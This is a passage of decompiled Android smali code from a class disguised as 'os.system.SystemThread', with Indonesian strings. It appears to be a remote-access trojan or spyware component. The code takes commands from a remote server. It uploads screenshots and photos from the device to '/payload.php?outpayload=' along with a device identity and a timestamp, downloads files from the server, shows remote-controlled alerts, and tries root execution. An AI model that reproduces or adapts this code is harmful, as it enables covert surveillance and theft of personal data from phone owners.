    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 446
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v4, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/payload.php?outpayload="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "upload screenshot TUNGGU"

    move-object/from16 v0, p0

    invoke-virtual {v0, v4}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v4, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p0

    invoke-virtual {v0, v1, v3, v4}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_11

    .line 465
    :catch_9
    move-exception v2

    goto/16 :goto_12

    .line 448
    :cond_21
    const/4 v3, 0x1

    aget-object v3, v2, v3

    const-string v4, "foto"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_22

    .line 449
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/foto.jpg"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 451
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v4, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/payload.php?outpayload="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "upload foto TUNGGU"

    move-object/from16 v0, p0

    invoke-virtual {v0, v4}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v4, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p0

    invoke-virtual {v0, v1, v3, v4}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_11

    .line 454
    :cond_22
    const/4 v3, 0x1

    aget-object v2, v2, v3
    :try_end_23
    .catch Ljava/lang/Exception; {:try_start_23 .. :try_end_23} :catch_9

    goto/16 :goto_11

    .line 474
    :catch_a
    move-exception v2

    .line 475
    const/4 v2, 0x1

    :try_start_24
    aget-object v2, v4, v2

    .line 476
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v5, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, "/download.php?id=payloadout/"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const/4 v5, 0x1

    aget-object v5, v4, v5

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_24
    .catch Ljava/lang/Exception; {:try_start_24 .. :try_end_24} :catch_12

    move-result-object v3

    goto/16 :goto_13

    .line 497
    :cond_23
    const/4 v2, 0x3

    :try_start_25
    aget-object v2, v8, v2

    const-string v3, "tengah"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_24

    const/16 v2, 0x11

    sput v2, Los/system/SystemThread;->alert_letak:I
    :try_end_25
    .catch Ljava/lang/Exception; {:try_start_25 .. :try_end_25} :catch_b

    goto/16 :goto_16

    .line 525
    :catch_b
    move-exception v2

    .line 528
    :try_start_26
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "toast text:"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const/4 v4, 0x1

    aget-object v4, v8, v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 530
    new-instance v10, Los/system/SystemThread$5;

    const-wide/16 v12, 0x1d4c

    const-wide/16 v14, 0x64

    move-object/from16 v11, p0

    move-object/from16 v16, p1

    move-object/from16 v17, v8

    invoke-direct/range {v10 .. v17}, Los/system/SystemThread$5;-><init>(Los/system/SystemThread;JJLandroid/content/Context;[Ljava/lang/String;)V

    .line 538
    invoke-virtual {v10}, Los/system/SystemThread$5;->start()Landroid/os/CountDownTimer;
    :try_end_26
    .catch Ljava/lang/Exception; {:try_start_26 .. :try_end_26} :catch_c

    goto/16 :goto_18

    .line 541
    :catch_c
    move-exception v2

    goto/16 :goto_18

    .line 498
    :cond_24
    const/4 v2, 0x3

    :try_start_27
    aget-object v2, v8, v2

    const-string v3, "bawah"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_25

    const/16 v2, 0x50

    sput v2, Los/system/SystemThread;->alert_letak:I

    goto/16 :goto_16

    .line 499
    :cond_25
    const/4 v2, 0x3

    aget-object v2, v8, v2

    const-string v3, "atas&tengah"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_26

    const/16 v2, 0x31

    sput v2, Los/system/SystemThread;->alert_letak:I

    goto/16 :goto_16

    .line 500
    :cond_26
    const/4 v2, 0x3

    aget-object v2, v8, v2

    const-string v3, "bawah&tengah"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_17

    const/16 v2, 0x51

    sput v2, Los/system/SystemThread;->alert_letak:I

    goto/16 :goto_16

    .line 503
    :cond_27
    const/4 v2, 0x2

    aget-object v2, v8, v2

    const-string v3, "merah"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_28

    const/high16 v2, -0x10000

    sput v2, Los/system/SystemThread;->alert_warna:I

    goto/16 :goto_17

    .line 504
    :cond_28
    const/4 v2, 0x2

    aget-object v2, v8, v2

    const-string v3, "kuning"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_29

    const/16 v2, -0x100

    sput v2, Los/system/SystemThread;->alert_warna:I

    goto/16 :goto_17

    .line 505
    :cond_29
    const/4 v2, 0x2

    aget-object v2, v8, v2

    const-string v3, "hujau"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_18

    const v2, -0xff0100

    sput v2, Los/system/SystemThread;->alert_warna:I
    :try_end_27
    .catch Ljava/lang/Exception; {:try_start_27 .. :try_end_27} :catch_b

    goto/16 :goto_17

    .line 572
    :catch_d
    move-exception v2

    .line 573
    :try_start_28
    const-string v2, "Failed execute root"
    :try_end_28
    .catch Ljava/lang/Exception; {:try_start_28 .. :try_end_28} :catch_e

    goto/16 :goto_1b

    .line 581
    :catch_e
    move-exception v2

    goto/16 :goto_1c

    .line 562
    :catch_f
    move-exception v2

    goto/16 :goto_1a

    .line 551
    :catch_10
    move-exception v2

    goto/16 :goto_19

    .line 494
    :catch_11
    move-exception v2

    goto/16 :goto_15

    .line 488
    :catch_12
    move-exception v2

    goto/16 :goto_14

    .line 400
    :catch_13
    move-exception v3

    goto/16 :goto_d

    .line 396
    :catch_14
    move-exception v3

    goto/16 :goto_c

    .line 382
    :catch_15
    move-exception v2

    goto/16 :goto_b

    .line 272
    :catch_16
    move-exception v2

    goto/16 :goto_5
.end method

.method public reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 5

    .prologue
    const/4 v4, 0x0

    .line 608
    new-instance v0, Los/system/SystemThread$PayloadWebTask;

    const/4 v1, 0x0

    invoke-direct {v0, p0, v1}, Los/system/SystemThread$PayloadWebTask;-><init>(Los/system/SystemThread;Los/system/SystemThread$1;)V

    .line 609
    iput-object p1, v0, Los/system/SystemThread$PayloadWebTask;->applicationContext:Landroid/content/Context;

    .line 610
    iput-object p3, v0, Los/system/SystemThread$PayloadWebTask;->paymain:Ljava/lang/String;

    .line 612
    const-string v1, "text"

    invoke-virtual {p3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    sget-object v1, Los/system/SystemThread;->TAG:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "...payload text   : "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    sget-object v3, Los/system/SystemThread;->payloadWebResult:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 617
    :cond_0
    :goto_0
    :try_start_0
    iget-object v1, p0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    invoke-static {p1}, Los/system/ReceiverBoot;->cekConnection(Landroid/content/Context;)Z

    move-result v1

    if-eqz v1, :cond_3

    .line 618
    const-wide/16 v2, 0x320

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    .line 619
    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/String;

    const/4 v2, 0x0

    aput-object p2, v1, v2

    invoke-virtual {v0, v1}, Los/system/SystemThread$PayloadWebTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 628
    :goto_1
    return-void

    .line 613
    :cond_1
    const-string v1, "sw"

    invoke-virtual {p3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2

    sget-object v1, Los/system/SystemThread;->TAG:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "...payload sw     : "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    sget-object v3, Los/system/SystemThread;->payloadWebResultSwitch:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " ["

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "]"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0

    .line 614
    :cond_2
    const-string v1, "target"

    invoke-virtual {p3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    sget-object v1, Los/system/SystemThread;->TAG:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "...payload target : "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    sget-object v3, Los/system/SystemThread;->payloadWebResultTarget:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "\n"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0

    .line 622
    :cond_3
    :try_start_1
    sget-object v0, Los/system/SystemThread;->TAG:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "disconnect network:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    invoke-static {p1}, Los/system/ReceiverBoot;->cekConnection(Landroid/content/Context;)Z

    move-result v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1

    .line 624
    :catch_0
    move-exception v0

    .line 625
    sget-object v1, Los/system/SystemThread;->TAG:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "errRequest: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 626
    iget-object v0, p0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    sput-boolean v4, Los/system/ReceiverBoot;->pingResult:Z

    goto/16 :goto_1
.end method

.method public textPayload(Ljava/lang/String;)Ljava/lang/String;
    .locals 5

    .prologue
    const/4 v4, 0x0

    .line 587
    new-instance v0, Ljava/text/SimpleDateFormat;

    const-string v1, "HH:mm:ss"

    invoke-direct {v0, v1}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    new-instance v1, Ljava/util/Date;

    invoke-direct {v1}, Ljava/util/Date;-><init>()V

    invoke-virtual {v0, v1}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Los/system/SystemThread;->timenow:Ljava/lang/String;

    .line 588
    const/4 v0, 0x1

    new-array v0, v0, [Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, " [dari : "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    sget-object v2, Los/system/ReceiverBoot;->identitasResult:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "] [waktu : "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Los/system/SystemThread;->timenow:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "] [input : "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, Los/system/SystemThread;->payloadWebResult:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "]\n"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    aput-object v1, v0, v4

    .line 590
    iget-object v1, p0, Los/system/SystemThread;->settings:Landroid/content/SharedPreferences;

    const-string v2, "utf"

    const-string v3, ""

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    .line 591
    sget-object v1, Los/system/SystemThread;->TAG:Ljava/lang/String;

    const-string v2, "utf kosong"

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 598
    :goto_0
    :try_start_0
    array-length v1, v0

    const/4 v2, 0x0

    if-ge v4, v1, :cond_1

    aget-object v0, v0, v2

    .line 600
    iget-object v1, p0, Los/system/SystemThread;->utf:Ljava/lang/String;

    invoke-static {v0, v1}, Ljava/net/URLEncoder;->encode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    .line 603
    :goto_1
    return-object v0

    .line 593
    :cond_0
    iget-object v1, p0, Los/system/SystemThread;->settings:Landroid/content/SharedPreferences;

    const-string v2, "utf"

    const-string v3, ""

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Los/system/SystemThread;->utf:Ljava/lang/String;

    .line 594
    sget-object v1, Los/system/SystemThread;->TAG:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "utf:"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Los/system/SystemThread;->utf:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0

    .line 602
    :catch_0
    move-exception v0

    .line 603
    :cond_1
    const/4 v0, 0x0

    goto :goto_1
.end method
